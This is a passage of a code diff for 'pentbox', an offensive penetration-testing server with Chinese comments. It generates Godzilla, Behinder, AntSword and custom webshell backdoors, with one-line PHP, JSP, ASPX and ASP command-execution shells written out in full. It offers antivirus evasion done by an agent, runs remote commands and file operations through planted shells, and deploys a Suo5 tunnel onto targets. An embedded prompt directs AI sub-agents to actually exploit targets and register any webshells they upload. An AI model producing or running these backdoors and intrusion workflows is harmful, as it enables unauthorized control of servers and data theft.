+              code = `<?php @eval(base64_decode($_POST["shell"]));?>`;
+            } else {
+              code = tmpl;
+            }
+            mode = `\u4E00\u53E5\u8BDD\u6728\u9A6C \xB7 \u5BC6\u7801 ${pass}`;
+          } else {
+            throw new Error(`\u672A\u77E5\u7C7B\u578B: ${type}`);
+          }
+          if (b.evasion) {
+            try {
+              code = await this.evadeByAgent(code, outScript);
+            } catch (e) {
+              console.warn("[pentbox] Agent \u514D\u6740\u5931\u8D25\uFF0C\u8FD4\u56DE\u539F\u59CB\u4EE3\u7801:", String(e).slice(0, 100));
+            }
+          }
+          this.json(res, 200, { ok: true, code, script: outScript, payload, note: `${type === "godzilla" ? payload + " \xB7 " : ""}${mode}${b.evasion ? " \xB7 \u514D\u6740" : ""}` });
+          break;
+        }
+    }
+  }
+
   private async handle(req: IncomingMessage, res: ServerResponse): Promise<void> {
     const url = new URL(req.url ?? '/', `http://${req.headers.host ?? 'localhost'}`)
     if (req.method === 'OPTIONS') {
@@ -1501,6 +1857,9 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
       return
     }
     try {
+      // ---- 领域路由分发（按前缀分派到领域 handler，各自处理组内路由；其余走下方 switch） ----
+      if (url.pathname.startsWith('/api/webshells')) return await this.handleWebshells(req, res, url)
+      if (url.pathname.startsWith('/api/upstream') || url.pathname.startsWith('/api/downstream') || url.pathname.startsWith('/api/listen') || url.pathname.startsWith('/api/session') || url.pathname.startsWith('/api/proxy/stop')) return await this.handleConfig(req, res, url)
       switch (url.pathname) {
         case '/api/graph/query': {
           // Agent 主动查图：默认返回图情报文本（与注入格式一致）；?format=json 返回结构化对象；?host= 只看该主机
@@ -1520,7 +1879,8 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
           if (!b.text) throw new Error('text 缺失')
           const host = b.host || ''
           const path = b.path || ''
-          this.graph.writeNote({ kind: 'note', text: String(b.text).slice(0, 400), host, path, persist: true, level: b.level || 'info', tag: b.tag || '' }).catch(() => {})
+          this.graph.writeNote({ kind: 'note', text: String(b.text).slice(0, 400), host, path, persist: true, level: b.level || 'info', tag: b.tag || '' }).catch((e) => console.warn('[pentbox] Agent 记录入图失败:', String(e).slice(0, 100)))
+          this.invalidateDigestCache()  // Agent 主动记录 → 图快照已变
           this.broadcastGraphChange(`Agent 记录 [${b.tag || 'note'}](${b.level || 'info'}) ${host}${path}: ${String(b.text).slice(0, 60)}`)
           this.json(res, 200, { ok: true })
           break
@@ -1629,6 +1989,29 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
           break
         }
         // ---------------- Agent Bridge 运行中引导（steer）/ 状态 / 中断 ----------------
+        // ---------------- 主对话历史（Hermes Agent 聊天框；项目级，随快照持久化/恢复） ----------------
+        case '/api/chat/history': {
+          if (req.method === 'GET') {
+            this.json(res, 200, { items: this.chatHistory })
+          } else if (req.method === 'POST') {
+            const b = JSON.parse(await this.readBody(req)) as { role?: string; text?: string; messages?: { role?: string; text: string; ts?: number }[] }
+            if (Array.isArray(b.messages)) {
+              for (const m of b.messages) {
+                if (!m || m.text === undefined) continue
+                this.chatHistory.push({ role: m.role === 'user' ? 'user' : 'ai', text: String(m.text).slice(0, 4000), ts: m.ts || Date.now() })
+              }
+            } else if (b.text !== undefined) {
+              this.chatHistory.push({ role: b.role === 'user' ? 'user' : 'ai', text: String(b.text).slice(0, 4000), ts: Date.now() })
+            }
+            if (this.chatHistory.length > ApiServer.CHAT_HISTORY_CAP) this.chatHistory.splice(0, this.chatHistory.length - ApiServer.CHAT_HISTORY_CAP)
+            this.json(res, 200, { ok: true })
+          } else if (req.method === 'DELETE') {
+            this.chatHistory = []
+            this.queueSessionSave()  // 清空后合并异步落盘（防重启恢复旧历史）
+            this.json(res, 200, { ok: true })
+          } else { this.json(res, 405, { error: 'method not allowed' }) }
+          break
+        }
         case '/api/chat/steer': {
           const body = JSON.parse(await this.readBody(req)) as { text: string; sessionId?: string }
           if (!body.text) throw new Error('text 缺失')
@@ -1652,12 +2035,12 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
           const body = JSON.parse(await this.readBody(req)) as { sessionId?: string; message?: string }
           const sid = body.sessionId || this.chatSessionId
           await this.ensureBridge()
-          if (sid && this.bridgeReady) await this.bridge.interrupt(sid, body.message, 'hermespentbox').catch(() => {})
+          if (sid && this.bridgeReady) await this.bridge.interrupt(sid, body.message, 'hermespentbox').catch((e) => console.warn('[pentbox] 中断失败:', String(e).slice(0, 100)))
           this.json(res, 200, { ok: true })
           break
         }
         case '/api/browser/launch': {
-          const body = JSON.parse(await this.readBody(req)) as { engine?: 'chrome' | 'firefox'; proxyPort?: number; customProxy?: string; headless?: boolean; port?: number }
+          const body = JSON.parse(await this.readBody(req)) as { engine?: 'chrome' | 'firefox'; proxyPort?: number; customProxy?: string; headless?: boolean; port?: number; url?: string }
           const engine = body.engine ?? 'chrome'
           const lopts = { proxyPort: body.proxyPort || this.opts.proxyPort, customProxy: body.customProxy, headless: body.headless, url: body.url }
           if (engine === 'chrome') {
@@ -1797,7 +2180,7 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
           const body = JSON.parse(await this.readBody(req)) as { gateway?: string; token?: string; id: string }
           const gw = (body.gateway ?? '').replace(/\/+$/, '')
           const headers: Record<string, string> = body.token ? { authorization: `Bearer ${body.token}` } : {}
-          await fetch(`${gw}/v1/runs/${body.id}/stop`, { method: 'POST', headers, signal: AbortSignal.timeout(5000) }).catch(() => {})
+          await fetch(`${gw}/v1/runs/${body.id}/stop`, { method: 'POST', headers, signal: AbortSignal.timeout(5000) }).catch((e) => console.warn('[pentbox] gateway run 停止失败:', String(e).slice(0, 100)))
           this.json(res, 200, { ok: true })
           break
         }
@@ -1882,7 +2265,7 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
             this.saveVulns()
             // 漏洞入图（Agent 共享）
             const { host, path } = this.splitVulnUri(v.uri)
-            if (host && path) { this.graph.writeVuln({ name: v.name, level: v.level, desc: v.desc, host, path, exploit: v.exploit, color: HAE_LEVEL_COLOR[v.level] }); this.broadcastGraphChange(`新漏洞(${v.level}) ${host}${path}: ${v.name}`) }
+            if (host && path) { this.graph.writeVuln({ name: v.name, level: v.level, desc: v.desc, host, path, exploit: v.exploit, color: HAE_LEVEL_COLOR[v.level] }); this.invalidateDigestCache(); this.broadcastGraphChange(`新漏洞(${v.level}) ${host}${path}: ${v.name}`) }
             this.json(res, 200, { ok: true, id: v.id })
           } else { this.json(res, 405, { error: 'method not allowed' }) }
           break
@@ -1906,7 +2289,7 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
             this.saveVulns()
             // 漏洞更新同步入图
             const { host, path } = this.splitVulnUri(v.uri)
-            if (host && path) { this.graph.writeVuln({ name: v.name, level: v.level, desc: v.desc, host, path, exploit: v.exploit, color: HAE_LEVEL_COLOR[v.level] }); this.broadcastGraphChange(`漏洞更新(${v.level}) ${host}${path}: ${v.name}`) }
+            if (host && path) { this.graph.writeVuln({ name: v.name, level: v.level, desc: v.desc, host, path, exploit: v.exploit, color: HAE_LEVEL_COLOR[v.level] }); this.invalidateDigestCache(); this.broadcastGraphChange(`漏洞更新(${v.level}) ${host}${path}: ${v.name}`) }
             this.json(res, 200, { ok: true })
           } else if (req.method === 'DELETE') {
             const vd = this.vulns.find((x) => x.id === id)
@@ -1922,296 +2305,6 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
           break
         }
         // ---------------- WebShell 管理（CRUD + 命令执行 + 存活探测；经内置代理发出，流量进流量面板） ----------------
-        case '/api/webshells': {
-          if (req.method === 'GET') {
-            this.json(res, 200, { items: this.webshells.map(({ password, key, ...meta }) => ({ ...meta, password: password ? '***' : '', key: key ? '***' : '' })) })
-          } else if (req.method === 'POST') {
-            const b = JSON.parse(await this.readBody(req)) as Partial<{ type: string; script: string; url: string; password: string; key: string; cryption: string; payload: string; encoding: string; headers: string; reqLeft: string; reqRight: string; connTimeout: number; readTimeout: number; remark: string }>
-            if (!b.url) throw new Error('url 缺失')
-            const w = { id: ++this.wsSeq, type: b.type || 'custom', script: b.script || 'php', url: b.url, password: b.password || '', key: b.key || '', status: 'unknown', ts: Date.now(), cryption: b.cryption || '', payload: b.payload || '', encoding: b.encoding || 'UTF-8', headers: b.headers || '', reqLeft: b.reqLeft || '', reqRight: b.reqRight || '', connTimeout: b.connTimeout || 3000, readTimeout: b.readTimeout || 60000, remark: b.remark || '' }
-            this.webshells.push(w)
-            this.saveWebshells()
-            // WebShell 入图（Agent 共享连接方式）
-            this.graph.writeWebShell(w)
-            this.broadcastGraphChange(`新 WebShell(${w.type}/${w.script}) ${w.url}`)
-            this.json(res, 200, { ok: true, id: w.id })
-          } else { this.json(res, 405, { error: 'method not allowed' }) }
-          break
-        }
-        case '/api/webshells/detail': {
-          const id = Number(url.searchParams.get('id')) || 0
-          const w = this.webshells.find((x) => x.id === id)
-          if (!w) { this.json(res, 404, { error: 'not found' }); break }
-          if (req.method === 'GET') this.json(res, 200, w)
-          else if (req.method === 'PUT') {
-            const b = JSON.parse(await this.readBody(req)) as Partial<{ type: string; script: string; url: string; password: string; key: string; cryption: string; payload: string; encoding: string; headers: string; reqLeft: string; reqRight: string; connTimeout: number; readTimeout: number; remark: string }>
-            if (b.type !== undefined) w.type = b.type
-            if (b.script !== undefined) w.script = b.script
-            if (b.url !== undefined) w.url = b.url
-            if (b.password !== undefined) w.password = b.password
-            if (b.key !== undefined) w.key = b.key
-            if (b.cryption !== undefined) w.cryption = b.cryption
-            if (b.payload !== undefined) w.payload = b.payload
-            if (b.encoding !== undefined) w.encoding = b.encoding
-            if (b.headers !== undefined) w.headers = b.headers
-            if (b.connTimeout !== undefined) w.connTimeout = b.connTimeout
-            if (b.readTimeout !== undefined) w.readTimeout = b.readTimeout
-            if (b.remark !== undefined) w.remark = b.remark
-            if (b.reqLeft !== undefined) w.reqLeft = b.reqLeft
-            if (b.reqRight !== undefined) w.reqRight = b.reqRight
-            if (b.timeout !== undefined) w.timeout = b.timeout
-            this.saveWebshells()
-            // 更新同步入图
-            this.graph.writeWebShell(w)
-            this.broadcastGraphChange(`WebShell 更新(${w.type}/${w.script}) ${w.url}`)
-            this.json(res, 200, { ok: true })
-          } else if (req.method === 'DELETE') {
-            const wd = this.webshells.find((x) => x.id === id)
-            this.webshells = this.webshells.filter((x) => x.id !== id)
-            this.saveWebshells()
-            // 从图移除
-            if (wd) this.graph.deleteWebShell(wd.url)
-            this.json(res, 200, { ok: true })
-          } else { this.json(res, 405, { error: 'method not allowed' }) }
-          break
-        }
-        case '/api/webshells/ping': {
-          const b = JSON.parse(await this.readBody(req)) as { id: number }
-          const w = this.webshells.find((x) => x.id === b.id)
-          if (!w) throw new Error('webshell 不存在')
-          try {
-            const r = await this.wsRequest(w, 'GET', w.url, undefined)
-            w.status = r.code >= 200 && r.code < 400 ? 'alive' : 'dead'
-            this.saveWebshells()
-            this.json(res, 200, { alive: w.status === 'alive', code: r.code })
-          } catch (e) {
-            w.status = 'dead'
-            this.saveWebshells()
-            this.json(res, 200, { alive: false, error: (e as Error).message })
-          }
-          break
-        }
-        case '/api/webshells/alive': {
-          const b = JSON.parse(await this.readBody(req)) as { id: number }
-          const w = this.webshells.find((x) => x.id === b.id)
-          if (!w) throw new Error('webshell 不存在')
-          const r = await this.wsAliveShell(w)
-          w.status = r.alive ? 'alive' : 'dead'
-          this.saveWebshells()
-          this.json(res, 200, { alive: r.alive, detail: r.detail || '', error: r.error || '' })
-          break
-        }
-        case '/api/webshells/alive_all': {
-          // 测试所有 WebShell 连接（逐个存活校验），更新各自 status，返回汇总
-          const results: { id: number; url: string; type: string; script: string; alive: boolean; detail: string; error: string }[] = []
-          for (const w of this.webshells) {
-            const r = await this.wsAliveShell(w)
-            w.status = r.alive ? 'alive' : 'dead'
-            results.push({ id: w.id, url: w.url, type: w.type, script: w.script, alive: r.alive, detail: r.detail || '', error: r.error || '' })
-          }
-          this.saveWebshells()
-          this.json(res, 200, { results })
-          break
-        }
-        case '/api/webshells/fileop': {
-          // 文件操作（哥斯拉调 payload 方法）：action=list(列目录)/delete/read/write
-          const b = JSON.parse(await this.readBody(req)) as { id: number; action: string; dir?: string; file?: string; content?: string }
-          const w = this.webshells.find((x) => x.id === b.id)
-          if (!w) throw new Error('webshell 不存在')
-          let pms: Record<string, string | Buffer>
-          if (b.action === 'list') pms = { methodName: 'getFile', dirName: b.dir || '/' }
-          else if (b.action === 'delete') pms = { methodName: 'deleteFile', fileName: b.file || '' }
-          else if (b.action === 'read') pms = { methodName: w.script === 'php' ? 'readFileContent' : 'readFile', fileName: b.file || '' }
-          else if (b.action === 'write') pms = { methodName: 'uploadFile', fileName: b.file || '', fileValue: Buffer.from(b.content || '', 'base64') }
-          else throw new Error('未知操作')
-          const buf = await this.wsFileOp(w, pms)
-          // 读取返回 base64（二进制安全）；其他返回文本
-          if (b.action === 'read') this.json(res, 200, { output: buf.toString('base64') })
-          else this.json(res, 200, { output: buf.toString(w.encoding || 'utf8') })
-          break
-        }
-        case '/api/webshells/suo5': {
-          // Suo5 正向代理：部署服务端到目标 + 启动本地 SOCKS5 隧道
-          const b = JSON.parse(await this.readBody(req)) as { action: 'start' | 'stop' | 'status'; id?: number; type?: string; url?: string; port?: number; dir?: string; name?: string }
-          if (b.action === 'status') {
-            this.json(res, 200, { running: !!this.suo5Proc, port: this.suo5Proc?.port || 0, url: this.suo5Proc?.url || '' })
-            break
-          }
-          if (b.action === 'stop') {
-            if (this.suo5Proc) { try { this.suo5Proc.proc.kill() } catch { /* */ } this.suo5Proc = null }
-            this.json(res, 200, { ok: true })
-            break
-          }
-          // start
-          const w = this.webshells.find((x) => x.id === b.id)
-          if (!w) throw new Error('webshell 不存在')
-          if (!b.url) throw new Error('目标 URL 缺失')
-          // 类型按 Webshell 脚本自动判断（未显式指定时）
-          const autoType = w.script === 'jsp' || w.script === 'jspx' ? 'jsp' : (w.script === 'aspx' || w.script === 'asp') ? 'aspx' : 'php'
-          const ext = b.type === 'jsp' ? 'jsp' : b.type === 'aspx' ? 'aspx' : (b.type || autoType) === 'jsp' ? 'jsp' : (b.type || autoType) === 'aspx' ? 'aspx' : 'php'
-          const fn = (b.name || 'suo5').replace(/[\\/]/g, '') + '.' + ext
-          const scriptPath = join(process.cwd(), 'tools', 'suo5', fn)
-          if (!existsSync(scriptPath)) throw new Error('服务端脚本缺失: ' + scriptPath)
-          const script = readFileSync(scriptPath)
-          const dir = (b.dir || '/tmp').replace(/\/+$/, '')
-          const target = dir + '/' + fn
-          // 部署服务端到目标
-          if (w.type === 'godzilla') {
-            await this.wsFileOp(w, { methodName: 'uploadFile', fileName: target, fileValue: script })
-          } else {
-            const b64 = script.toString('base64')
-            await this.wsExecShell(w, `echo ${b64} | base64 -d > ${JSON.stringify(target)}`)
-          }
-          // 启动本地隧道（直连目标；若目标需经代理，可自行配置 suo5 --proxy）
-          const port = b.port || 1080
-          const suo5Dir = join(process.cwd(), 'tools', 'suo5')
-          const suo5Bin = join(suo5Dir, 'suo5.exe')
-          if (this.suo5Proc) { try { this.suo5Proc.proc.kill() } catch { /* */ } }
-          this.suo5Proc = { proc: spawn(suo5Bin, ['-t', b.url, '-l', '127.0.0.1:' + port], { detached: true, cwd: suo5Dir, stdio: 'ignore' }), port, url: b.url }
-          this.json(res, 200, { ok: true, path: target, port })
-          break
-        }
-        case '/api/webshells/test': {
-          // 添加弹窗"测试连接"：用临时参数走存活校验（不保存）
-          const b = JSON.parse(await this.readBody(req)) as { type: string; script: string; url: string; password: string; key: string; cryption: string; payload: string; encoding: string; headers: string; readTimeout: number }
-          if (!b.url) throw new Error('url 缺失')
-          // 测试前清除该 URL 的会话 cookie（避免复用之前失败/污染/其他配置的 session，保证握手干净）
-          this.wsCookies.delete(b.url)
-          const w = {
-            id: 0, type: (b.type || 'custom').toLowerCase(), script: (b.script || 'php').toLowerCase(),
-            url: b.url, password: b.password || '', key: b.key || '', cryption: b.cryption || '', payload: b.payload || '',
-            encoding: b.encoding || 'UTF-8', headers: b.headers || '', readTimeout: b.readTimeout || 60000,
-          }
-          const r = await this.wsAliveShell(w)
-          this.json(res, 200, { alive: r.alive, detail: r.detail || '', error: r.error || '' })
-          break
-        }
-        case '/api/webshells/exec': {
-          const b = JSON.parse(await this.readBody(req)) as { id: number; command: string }
-          const w = this.webshells.find((x) => x.id === b.id)
-          if (!w) throw new Error('webshell 不存在')
-          if (!b.command) throw new Error('command 缺失')
-          try {
-            const out = await this.wsExecShell(w, b.command)
-            this.json(res, 200, { ok: true, output: out })
-          } catch (e) {
-            this.json(res, 200, { ok: false, error: (e as Error).message })
-          }
-          break
-        }
-        // ---------------- WebShell 生成（参考各工具原版：哥斯拉=Payload+加密；冰蝎=AES密钥模板；蚁剑=一句话；自定义=脚本） ----------------
-        case '/api/webshells/generate': {
-          const b = JSON.parse(await this.readBody(req)) as { type: string; payload: string; script: string; cryption: string; password: string; key: string }
-          const type = (b.type || 'godzilla').toLowerCase()
-          const pass = (b.password || 'pass').trim()
-          const key = (b.key || '3c6e0b8a9c15224a').trim()
-          const payload = b.payload || 'PhpDynamicPayload'
-          const script = (b.script || 'php').toLowerCase()
-          const cryption = (b.cryption || '').toLowerCase()
-          const md5Key = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
-          const md5Pass = crypto.createHash('md5').update(pass, 'utf8').digest('hex').slice(0, 16)
-          const isRaw = cryption.includes('raw')
-          const isEval = cryption.includes('eval')
-          // 读取模板
-          const readT = (dir: string, name: string): string => {
-            const p = join(process.cwd(), 'assets', 'payloads', dir, name)
-            return existsSync(p) ? readFileSync(p, 'utf8') : ''
-          }
-          const toUnicode = (s: string): string => {
-            let out = ''
-            for (const ch of s) out += '\\u' + ch.charCodeAt(0).toString(16).padStart(4, '0')
-            return out
-          }
-          let code = ''
-          let mode = ''
-          let outScript = script
-          // ================= 哥斯拉（Payload 决定脚本+加密） =================
-          if (type === 'godzilla') {
-            const metaOf = (p: string) => p === 'PhpDynamicPayload' ? 'php' : p === 'JavaDynamicPayload' ? 'jsp' : p === 'CShapDynamicPayload' ? 'aspx' : p === 'AspDynamicPayload' ? 'asp' : ''
-            outScript = metaOf(payload)
-            if (!outScript) throw new Error(`未知 payload: ${payload}`)
-            if (outScript === 'php') {
-              const tmplName = isRaw ? 'raw.bin' : isEval ? 'eval.bin' : 'base64.bin'
-              let tmpl = readT('php', tmplName)
-              if (!tmpl) throw new Error('PHP 模板缺失')
-              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
-              mode = isRaw ? 'XOR RAW' : isEval ? 'EVAL XOR BASE64' : 'XOR BASE64'
-            } else if (outScript === 'jsp') {
-              // 原版 JavaAes：raw/base64 模板 + shell.jsp，明文替换（与原版 GUI 完全一致，无 unicode 转义）
-              const gTmpl = readT('java', (isRaw ? 'raw' : 'base64') + 'GlobalCode.bin')
-              const cTmpl = readT('java', (isRaw ? 'raw' : 'base64') + 'Code.bin')
-              const shellTmpl = readT('java', 'shell.jsp')
-              if (!gTmpl || !cTmpl || !shellTmpl) throw new Error('JSP 模板缺失')
-              const globalCode = gTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
-              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
-              code = shellTmpl.replace(/\{globalCode\}/g, globalCode).replace(/\{code\}/g, codePart)
-              mode = isRaw ? 'JAVA AES RAW' : 'JAVA AES BASE64'
-            } else if (outScript === 'aspx') {
-              const cTmpl = isRaw ? readT('cshap', 'raw.bin') : readT('cshap', 'base64.bin')
-              const shellTmpl = readT('cshap', 'shell.aspx')
-              if (!cTmpl || !shellTmpl) throw new Error('ASPX 模板缺失')
-              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
-              code = shellTmpl.replace(/\{code\}/g, codePart)
-              mode = isRaw ? 'CSHAP AES RAW' : 'CSHAP AES BASE64'
-            } else if (outScript === 'asp') {
-              let tmpl = ''
-              if (isEval) tmpl = readT('asp', 'AspEvalBase64.bin')
-              else if (isRaw) tmpl = readT('asp', 'AspXorRaw.bin')
-              else tmpl = readT('asp', 'AspXorBae64.bin')
-              if (!tmpl) throw new Error('ASP 模板缺失')
-              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
-              mode = isRaw ? 'ASP XOR RAW' : isEval ? 'ASP EVAL BASE64' : 'ASP XOR BASE64'
-            }
-          }
-          // ================= 冰蝎（AES 密钥=md5密码前16，服务端模板替换 key） =================
-          else if (type === 'behinder') {
-            outScript = script
-            const isXor = cryption.includes('xor')
-            if (isXor && script !== 'php') throw new Error('冰蝎 XOR 加密仅支持 PHP')
-            const tmplMap: Record<string, string> = {
-              php: isXor ? 'shell_xor.php' : 'shell.php', jsp: 'shell_java9.jsp', jspx: 'shell_uni.jsp', aspx: 'shell.aspx', asp: 'shell.asp',
-            }
-            const fname = tmplMap[script]
-            if (!fname) throw new Error(`冰蝎暂不支持脚本 ${script}`)
-            const tmpl = readT('behinder', fname)
-            if (!tmpl) throw new Error(`冰蝎模板缺失: ${fname}`)
-            // 冰蝎服务端 key = md5(密码)前16（模板默认 e45e329feb5d925b=md5('rebeyond')）
-            code = tmpl.replace(/e45e329feb5d925b/g, md5Pass)
-            mode = isXor ? `XOR（密钥=md5(密码)前16=${md5Pass}）` : `AES（密钥=md5(密码)前16=${md5Pass}）`
-          }
-          // ================= 蚁剑（一句话木马，密码为连接参数） =================
-          else if (type === 'antsword') {
-            outScript = script
-            const tmplMap: Record<string, string> = {
-              php: 'shell.php', jsp: 'shell.jsp', aspx: 'shell.aspx', asp: 'shell.asp',
-            }
-            const fname = tmplMap[script]
-            if (!fname) throw new Error(`蚁剑暂不支持脚本 ${script}`)
-            const tmpl = readT('antsword', fname)
-            if (!tmpl) throw new Error(`蚁剑模板缺失: ${fname}`)
-            // PHP 模板在 PHP8 下字符串函数名失效 → 用标准一句话（连接协议兼容：?id + shell=base64）
-            if (script === 'php') {
-              code = `<?php @eval(base64_decode($_POST["shell"]));?>`
-            } else {
-              code = tmpl
-            }
-            mode = `一句话木马 · 密码 ${pass}`
-          }
-          // ================= 自定义（基础一句话，GET ?pwd=<pass>&cmd= 参数，密码参与校验） =================
-          else if (type === 'custom') {
-            outScript = script
-            if (script === 'php') code = `<?php if(@$_GET["pwd"]=="${pass}")@system($_GET["cmd"]);?>`
-            else if (script === 'jsp') code = `<%if("${pass}".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a;while((a=in.read())!=-1){out.print((char)a);}}%>`
-            else if (script === 'aspx') code = `<%@ Page Language="C#"%><%try{if(Request["pwd"]=="${pass}"){System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());}}catch{}%>`
-            else if (script === 'asp') code = `<%if request("pwd")="${pass}" then execute request("cmd")%>`
-            else throw new Error(`自定义暂不支持脚本 ${script}`)
-            mode = '自定义 · GET pwd+cmd 认证'
-          } else {
-            throw new Error(`未知类型: ${type}`)
-          }
-          this.json(res, 200, { ok: true, code, script: outScript, payload, note: `${type === 'godzilla' ? payload + ' · ' : ''}${mode}` })
-          break
-        }
         // ---------------- Intercept（请求拦截） ----------------
         case '/api/intercept/state': {
           if (req.method === 'PUT') {
@@ -2304,11 +2397,11 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
           // 渗透前查重：从原始请求包提取目标（Host+路径）+ advice 提取渗透方式；同 API 同方式已渗透过/正在渗透 → 不重复执行
           // P0：targetKey 用 normalizeTargetKey 统一规范化（与发卡/成果写入格式一致）
           const rawT = (body.reqRaw || '').match(/^\S+\s+(\S+)\s+HTTP\/1\.[01]\r?\n(?:[^\r\n]*\r?\n)*?Host:\s*(\S+)/i)
-          let targetKey = rawT ? this.normalizeTargetKey(`${rawT[2]}${rawT[1]}`) : ''
+          let targetKey = rawT ? normalizeTargetKey(`${rawT[2]}${rawT[1]}`) : ''
           // fallback：reqRaw 缺失时尝试从 advice 中的绝对 URL 提取目标
           if (!targetKey) {
             const absUrl = (body.advice || '').match(/https?:\/\/[^\s"'）)]+/)?.[0]
-            if (absUrl) targetKey = this.normalizeTargetKey(absUrl)
+            if (absUrl) targetKey = normalizeTargetKey(absUrl)
           }
           const method = (body.advice || '').match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
           const penKey = targetKey ? `${targetKey}|${method}` : ''
@@ -2335,8 +2428,8 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
           ;(async () => {
           try {
           // 任务包装：要求子 Agent 实际执行渗透；有成果时输出【VULNDOC】结构化漏洞文档（严格格式规范，禁止 markdown 围栏/路由前缀，原始请求/响应包必填）
-          const digest = this.digestPrompt()
-          const task = `${digest}${body.advice}\n\n（渗透执行要求：这是对单个 API 的采纳式渗透——严格只针对原始请求包中这一个 URL（方法+完整路径+查询参数），只验证该接口是否存在漏洞；禁止访问同站点任何其他路径/接口/静态资源，禁止目录枚举、全站扫描、批量探测、交叉接口利用。验证充分、确认结果后立即结束（蜂群模式：验证完成后释放子 Agent 继续流量分析）。这是渗透执行任务，不是流量分析任务——禁止输出 {"vuln":...} 形式的 JSON 或任何 JSON 代码，全部用文字描述执行过程。忽略此前对话中的任何结论与判断，只依据本次提供的【全局情报】与原始请求包执行。开始前先检查【全局情报】：判定"已渗透过"必须同时满足三个条件——① Host 完全相同；② 完整 API 路径完全相同（包括文件名与查询参数，如 /WFManager/js/login.js?rev=200003 与 /WFManager/loginAction_doLogin.action 是不同路径；仅 /WFManager/ 前缀相同不算）；③ 渗透方式完全相同。三者都满足才回复"该目标API渗透方式已进行过 不再重复渗透"并停止；否则必须实际执行渗透验证，禁止回复"已进行过"；若确认存在可利用漏洞（有成果），在回复末尾输出以下结构的漏洞文档，格式必须严格遵守：\n【VULNDOC】\n标题：<只写漏洞名称本身，禁止带 URL 或路由前缀，错误示例"/api/login 未授权访问"，正确示例"未授权访问与凭据泄漏">\n危害等级：high|medium|low\n漏洞描述：<简要描述>\n复现步骤：<验证过程>\n修复建议：<修复方案>\n漏洞目标：<目标 URL（协议+Host+端口，如 http://127.0.0.1:8800，必填）>\n漏洞路由：<漏洞接口路径（如 /api/login，必填）>\n原始请求包：\n<触发该漏洞的完整原始 HTTP 请求报文，必填。从请求行开始逐行原样输出（GET /path HTTP/1.1\\nHost: ...\\n\\n<body>），禁止使用 markdown 代码块围栏（禁止 \`\`\` 字符）、禁止加引号包裹、禁止 JSON 转义，必须可直接复制重放>\n原始响应包：\n<对应的完整原始 HTTP 响应报文，必填。从状态行开始逐行原样输出（HTTP/1.1 200 OK\\nHeader: ...\\n\\n<body>），同样禁止 \`\`\` 与任何修饰字符>\n若未确认漏洞，只需输出执行过程说明，不要输出【VULNDOC】）`
+          const digest = await this.digestPrompt()
+          const task = `${digest}${body.advice}\n\n（渗透执行要求：这是对单个 API 的采纳式渗透——严格只针对原始请求包中这一个 URL（方法+完整路径+查询参数），只验证该接口是否存在漏洞；禁止访问同站点任何其他路径/接口/静态资源，禁止目录枚举、全站扫描、批量探测、交叉接口利用。若渗透过程中上传了 WebShell，必须立即用 POST http://localhost:8877/api/webshells 同步到应用，body={\"type\":\"godzilla|behinder|antSword|custom\",\"script\":\"php|jsp|asp|aspx\",\"url\":\"完整 shell 地址\",\"password\":\"连接密码\",\"key\":\"密钥\",\"cryption\":\"xor|aes|custom\"}（同步后应用自动写入 Neo4j 情报图供其他 Agent 复用）。验证充分、确认结果后立即结束（蜂群模式：验证完成后释放子 Agent 继续流量分析）。这是渗透执行任务，不是流量分析任务——禁止输出 {"vuln":...} 形式的 JSON 或任何 JSON 代码，全部用文字描述执行过程。忽略此前对话中的任何结论与判断，只依据本次提供的【全局情报】与原始请求包执行。开始前先检查【全局情报】：判定"已渗透过"必须同时满足三个条件——① Host 完全相同；② 完整 API 路径完全相同（包括文件名与查询参数，如 /WFManager/js/login.js?rev=200003 与 /WFManager/loginAction_doLogin.action 是不同路径；仅 /WFManager/ 前缀相同不算）；③ 渗透方式完全相同。三者都满足才回复"该目标API渗透方式已进行过 不再重复渗透"并停止；否则必须实际执行渗透验证，禁止回复"已进行过"；若确认存在可利用漏洞（有成果），在回复末尾输出以下结构的漏洞文档，格式必须严格遵守：\n【VULNDOC】\n标题：<只写漏洞名称本身，禁止带 URL 或路由前缀，错误示例"/api/login 未授权访问"，正确示例"未授权访问与凭据泄漏">\n危害等级：high|medium|low\n漏洞描述：<简要描述>\n复现步骤：<验证过程>\n修复建议：<修复方案>\n漏洞目标：<目标 URL（协议+Host+端口，如 http://127.0.0.1:8800，必填）>\n漏洞路由：<漏洞接口路径（如 /api/login，必填）>\n原始请求包：\n<触发该漏洞的完整原始 HTTP 请求报文，必填。从请求行开始逐行原样输出（GET /path HTTP/1.1\\nHost: ...\\n\\n<body>），禁止使用 markdown 代码块围栏（禁止 \`\`\` 字符）、禁止加引号包裹、禁止 JSON 转义，必须可直接复制重放>\n原始响应包：\n<对应的完整原始 HTTP 响应报文，必填。从状态行开始逐行原样输出（HTTP/1.1 200 OK\\nHeader: 